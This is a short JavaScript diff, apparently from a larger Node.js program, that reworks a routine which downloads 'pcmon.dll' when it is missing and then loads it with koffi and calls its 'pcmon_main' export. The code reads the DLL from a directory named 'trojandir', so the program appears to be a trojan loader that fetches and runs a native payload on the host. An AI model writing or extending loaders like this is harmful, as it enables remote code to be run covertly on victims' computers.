@@ -3261,7 +3261,14 @@ function cleanup() {
 
 function launch_pcmon_koffi() {
     const koffi = require('koffi');
-    const lib = koffi.load(path.join(systemstate.trojandir, 'pcmon.dll'));
+
+    let dllpath = path.join(systemstate.trojandir, 'pcmon.dll');
+
+    if ( ! fileExists(dllpath) ) {
+        throw new Error('dll does not exist '+dllpath);
+    }
+
+    const lib = koffi.load(dllpath);
     const pcmon_func = lib.func('__stdcall', 'pcmon_main', 'int', []);
     pcmon_func();
 }
@@ -3282,24 +3289,32 @@ async function download_pcmon() {
         await retrieve_asset("pcmon.dll");
 }
 
+async function pcmon_tpl() {
+    let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
+
+    if ( ! fileExists(dllpath) ) {
+        await download_pcmon();
+
+        if ( ! fileExists(dllpath) ) {
+            throw new Error('failed to download pcmon.dll');
+        }
+    }
+
+    try {
+        launch_pcmon_koffi();
+    } catch (err) {
+        logmsg(err);
+    }
+
+}
+
 async function pcmon() {
     logmsg("starting");
 
     let pcmoncmd = systemstate.cmdconfig;
     
     if ( systemstate.istpl ) {
-        let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
-
-        if ( ! fileExists(dllpath) ) {
-            await download_pcmon();
-        }
-
-        try {
-            launch_pcmon_koffi();
-        } catch (err) {
-            logmsg(err);
-        }
-
+        await pcmon_tpl();
         return;
     }
 
